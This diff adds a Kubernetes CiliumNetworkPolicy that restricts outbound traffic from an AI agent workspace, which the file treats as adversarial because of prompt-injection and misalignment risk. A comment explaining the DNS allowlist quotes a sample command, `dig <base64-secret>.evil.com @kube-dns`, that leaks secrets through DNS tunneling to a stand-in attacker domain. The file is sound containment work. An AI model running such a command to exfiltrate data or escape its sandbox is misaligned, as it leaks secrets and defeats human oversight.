@@ -1,0 +1,63 @@
+# Workspace egress envelope. The workspace is adversarial: LLM-driven
+# code under prompt-injection / tool-injection / misalignment risk. This
+# CNP is the SOLE workspace egress policy — it owns both L4 destinations
+# (kube-dns, tightbeam-ctrl, airlock-ctrl) AND the L7 DNS allowlist on
+# kube-dns. Default-deny otherwise.
+#
+# Why a single CNP and not a K8s NetworkPolicy alongside: Cilium's
+# documented "L4 shadows L7" merge semantics
+# (https://docs.cilium.io/en/stable/security/policy/layer7/) cause a
+# K8s NP that allows kube-dns:53 with no L7 rule to silently nullify
+# any sibling CNP's L7 DNS allowlist. The proxy redirects the flow but
+# evaluates the union ruleset as permissive. Empirically verified on
+# Cilium 1.19.3.
+#
+# The L7 allowlist closes the DNS-tunneling exfil vector: without it, a
+# workspace can `dig <base64-secret>.evil.com @kube-dns` and leak data
+# through the resolver chain even with no external IP egress reachable.
+# Only `tightbeam-ctrl.<ns>.svc.cluster.local` and
+# `airlock-ctrl.<ns>.svc.cluster.local` lookups are forwarded; all other
+# DNS queries drop at the Cilium L7 proxy before reaching kube-dns.
+apiVersion: cilium.io/v2
+kind: CiliumNetworkPolicy
+metadata:
+  name: workspace-egress
+  namespace: {{ .Release.Namespace }}
+  labels:
+    {{- include "sycophant.labels" . | nindent 4 }}
+spec:
+  endpointSelector:
+    matchLabels:
+      app.kubernetes.io/component: workspace
+      app.kubernetes.io/part-of: sycophant
+  egress:
+    - toEndpoints:
+        - matchLabels:
+            io.kubernetes.pod.namespace: kube-system
+            k8s-app: kube-dns
+      toPorts:
+        - ports:
+            - port: "53"
+              protocol: UDP
+            - port: "53"
+              protocol: TCP
+          rules:
+            dns:
+              - matchName: "tightbeam-ctrl.{{ .Release.Namespace }}.svc.cluster.local"
+              - matchName: "airlock-ctrl.{{ .Release.Namespace }}.svc.cluster.local"
+    - toEndpoints:
+        - matchLabels:
+            app.kubernetes.io/name: tightbeam-ctrl
+            app.kubernetes.io/part-of: sycophant
+      toPorts:
+        - ports:
+            - port: "9090"
+              protocol: TCP
+    - toEndpoints:
+        - matchLabels:
+            app.kubernetes.io/name: airlock-ctrl
+            app.kubernetes.io/part-of: sycophant
+      toPorts:
+        - ports:
+            - port: "9090"
+              protocol: TCP
